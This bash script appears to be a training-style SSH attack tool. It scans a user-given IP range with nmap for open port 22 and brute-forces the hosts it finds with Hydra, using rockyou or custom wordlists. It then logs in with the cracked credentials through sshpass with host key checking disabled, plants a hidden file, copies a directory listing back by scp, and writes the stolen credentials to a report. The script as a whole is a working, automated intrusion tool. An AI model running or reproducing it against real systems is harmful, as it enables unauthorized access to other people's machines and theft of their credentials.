#!/bin/bash

# Create color variables for aesthetic purposes.
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Reset to no color

# Create variables to check if required dependencies are installed.
echo -e "${YELLOW}Running a depency check...${NC}"
echo ''
locate_sshpass=$(command -v sshpass)
locate_hydra=$(command -v hydra)
locate_nmap=$(command -v nmap)

# Using if-else and case statements, automate installation of required dependencies.
if [ -z $locate_sshpass ]
then
	echo -e "${RED}Your machine does not have SSHPass installed.${NC}"
	read -p 'Proceed with installation? [Yes/No] ' install_sshpass
	case $install_sshpass in
	Y|y|Yes|yes|YES)
		sudo apt-get update && sudo apt-get install -y sshpass
	;;
	*)
		echo ''
		echo 'Please proceed to manually install the following dependencies:'
		echo '- sudo apt-get update && sudo apt-get install sshpass -y'
		echo ''
		exit
	esac
else 
	echo -e "\u2713 ${GREEN}Your machine has SSHPass installed.${NC}"
fi

if [ -z $locate_hydra ]
then
	echo -e "${RED}Your machine does not have HYDRA installed.${NC}"
	read -p 'Proceed with installation? [Yes/No] ' install_hydra
	case $install_hydra in
	Y|y|Yes|yes|YES)
		sudo apt-get update && sudo apt-get install -y hydra
	;;
	*)
		echo ''
		echo 'Please proceed to manually install the following dependencies:'
		echo '- sudo apt-get update && sudo apt-get install -y hydra'
		echo ''
		exit
	esac
else 
	echo -e "\u2713 ${GREEN}Your machine has HYDRA installed.${NC}"
fi

if [ -z $locate_nmap ]
then
	echo -e "${RED}Your machine does not have NMAP installed.${NC}"
	read -p 'Proceed with installation? [Yes/No] ' install_nmap
	case $install_nmap in
	Y|y|Yes|yes|YES)
		sudo apt-get update && sudo apt-get install -y nmap
	;;
	*)
		echo ''
		echo 'Please proceed to manually install the following dependencies:'
		echo '- sudo apt-get update && sudo apt-get install -y nmap'
		echo ''
		exit
	esac
else 
	echo -e "\u2713 ${GREEN}Your machine has NMAP installed.${NC}"
fi

# Title of Script
figlet 'Welcome'
echo ''

# * User Action Required *
# Prompt user to input IP Addr Range / CIDR / Single IP Addr.
echo -e "${YELLOW}Please input your desired IP Address and range (if any):"
echo '[Example] Single IP Address	: 172.16.0.0'
echo '[Example] Range of IP Address	: 192.168.0.0-255'
echo -e "[Example] IP Address with CIDR	: 10.0.0.0/24${NC}"
echo ''

# Create Variable "ip_input" to store IP Addr input by user.
echo -e "${BLUE}"
read -p 'Enter IP range or subnet to scan:   ' ip_input
echo -e "${NC}"

# Create Variables to validate Single IP Addr and 
#IP Addr Range, to be called upon later.
regex='^((25[0-5]|2[0-4][0-9]|1?[0-9]{1,2}).){3}(25[0-5]|2[0-4][0-9]|1?[0-9]{1,2})$'
range=$(echo $ip_input | awk -F '-' '{print $2}')

# Create a Function to validate for CIDR, to be called upon later.
function validate_cidr() 
{

	if ! [[ $ip_input =~ ^([0-9]{1,3}.){3}[0-9]{1,3}/[0-9]{1,2}$ ]]
	then
    return 1
	fi
}

if [ -z "$ip_input" ] # Validate IP Addr Input by User.
then
	echo ''
	echo -e "${RED}Error: No input provided. Please try again.${NC}"
	echo ''
	exit

elif [[ $ip_input =~ $regex ]] # To validate accuracy of Single IP Addr.
then
	echo ''
	echo -e "${GREEN}This is a valid IP Address.${NC}"
	echo ''

elif [ ! validate_cidr ] # To validate accuracy of IP Address/CIDR using created Function.
then
	echo ''
	echo -e "${GREEN}This is a valid IP Address/CIDR.${NC}"
	echo ''

elif [ $range -ge 0 ] && [ $range -le 255 ] # To validate accuracy of IP Address shorthand range.
then
	echo ''
	echo -e "${GREEN}This is a valid range of IP Address.${NC}"
	echo ''
	
else
	echo -e "${RED}Error: Erroneous IP Address. Please try again.${NC}" 
	exit
	
fi

# Runing NMAP Scan with provided IP Address.
echo -e "${YELLOW}Scanning for available SSH Service, this may take awhile...${NC}"
echo ''

nmap $ip_input -p22 -oG scanResults.txt >/dev/null 2>&1 
cat scanResults.txt | grep open | awk '{print $2}' > list.txt # Filter only IP Addresses into a new file.

if [ -s list.txt ] 
then
	echo ''
	echo -e "${GREEN}These are the IP Address with active SSH Service.${NC}"
	cat list.txt
	echo ''

else
	echo ''
	echo -e "${RED}There are no active SSH Service within the IP Address provided.${NC}"
	echo ''
	exit
fi

# Start report generation
echo -e "${RED}--- Start of Report ---${NC}" >> Report.txt 
echo -e "${YELLOW}IP Address Provided for scanning:${NC}" >> Report.txt
echo $ip_input >> Report.txt
echo '' >> Report.txt 

# Add scan results to report
echo -e "${YELLOW}Scan results generated from nmap:${NC}" >> Report.txt 
cat scanResults.txt >> Report.txt 
echo '' >> Report.txt

# * User Action Required *
# Prompt user to decide if they'd like to commence brute force, and selected methods.
echo -e "${BLUE}"
read -p 'Would you like to proceed with Credential Brute Forcing? [Yes/No] ' decision1
echo -e "${NC}"
echo ''

# * User Action Required *
# Using case to start Hydra Brute Force.
case $decision1 in
	Y|y|Yes|yes|YES)
		echo -e "${YELLOW}[A] Use the system default username and password list"
		echo -e "[B] Use your own username and password list ${NC}"
		echo ''
		echo -e "${BLUE}"
		read -p 'Please choose from the above options [A/B ] :   ' decision2
		echo -e "${NC}"
		
		case $decision2 in 
		A|a)
			hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -M list.txt ssh -t 16 -f -o bruteForce.txt >/dev/null 2>&1
		;;
		B|b)
			echo -e "${BLUE}"
			read -p 'Enter the file name or directory that contains usernames:   ' user_username
			read -p 'Enter the file name or directory that contains passwords:   ' user_password
			hydra -L $user_username -P $user_password -M list.txt ssh -t 16 -f -o bruteForce.txt >/dev/null 2>&1
			echo -e "${NC}"
			echo ''
			if [ ! -f bruteForce.txt ]
			then
				echo -e "${RED}Error Occurred.${NC}"
				exit
			fi
		;;
		*)
			echo -e "${RED}Erroneous Input.${NC}"
			exit
		;;
		esac
	;;
	*)
		echo -e "${RED}Exiting.${NC}"
		exit
	;;
esac

# Validate that bruteForce.txt exists and contains successful credentials
if [ ! -f bruteForce.txt ]
then
    echo ''
    echo -e "${RED}Error: bruteForce.txt was not created. Hydra may have failed to run.${NC}"
    echo ''
    exit
fi

if ! grep -q "login:" bruteForce.txt
then
    echo ''
    echo -e "${RED}Brute force attempt was unsuccessful. No valid credentials were found.${NC}"
    echo ''
    echo -e "${YELLOW}Brute Force results (no credentials found):${NC}" >> Report.txt
    cat bruteForce.txt >> Report.txt
    echo -e "${RED}--- End of Report ---${NC}" >> Report.txt
    exit
fi

echo ''
echo -e "${GREEN}Valid credentials found! Proceeding...${NC}"
echo ''

# Create variables to store username, password and IP Address. To be used for SSH.
user=$(cat bruteForce.txt | grep login | awk '{print $(NF-2)}')
password=$(cat bruteForce.txt | grep login | awk '{print $(NF-0)}')
ipaddr=$(cat bruteForce.txt | grep login | awk '{print $3}')

# Add to report
echo -e "${YELLOW}Brute Force results generated from hydra:${NC}" >> Report.txt 
cat bruteForce.txt >> Report.txt 
echo '' >> Report.txt  
echo -e "${YELLOW}These are the credentials for $ipaddr SSH Service:${NC}" >> Report.txt  
echo "Username	: $user" >> Report.txt 
echo "Password	: $password" >> Report.txt 
echo '' >> Report.txt  

# Create hidden file within other machine to verify positive access.
echo -e "${YELLOW}Creating hidden file (.file.txt) ...${NC}"
sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$user@$ipaddr" 'touch .file.txt'
echo ''

# Add current date/time into report to prove that results are generated real-time
echo -e "${YELLOW}Hidden File Created Successfully:${NC}" >> Report.txt 
date "+%d-%m-%Y %H:%M:%S" >> Report.txt 

# Listing out contents of directory to prove hidden file has been successfully created
echo -e "${YELLOW}Hidden File Created Successfully.${NC}"
echo ''
sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$user@$ipaddr" 'ls -a >> dirList.txt'

pwd=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$user@$ipaddr" 'pwd')
sshpass -p "$password" scp -o StrictHostKeyChecking=no "$user@$ipaddr:$pwd/dirList.txt" .

# Add to report
cat dirList.txt >> Report.txt 
echo '' >> Report.txt 
echo -e "${RED}--- End of Report ---${NC}" >> Report.txt 

# Allow user to decide if they wish to view the generated report
echo -e "${BLUE}"
read -p 'Would you like to view the report generated from this brute force attempt? [Yes/No] ' report1
echo -e "${NC}"

case $report1 in
	Y|y|Yes|yes|YES)
		cat Report.txt
		figlet 'Finished.'
	;;
	*)
		echo "You may run [ cat Report.txt ] to view the report anytime."
		figlet 'Finished.'
esac

# Remove created files to keep file directory clean
rm bruteForce.txt
rm scanResults.txt
rm list.txt
rm dirList.txt
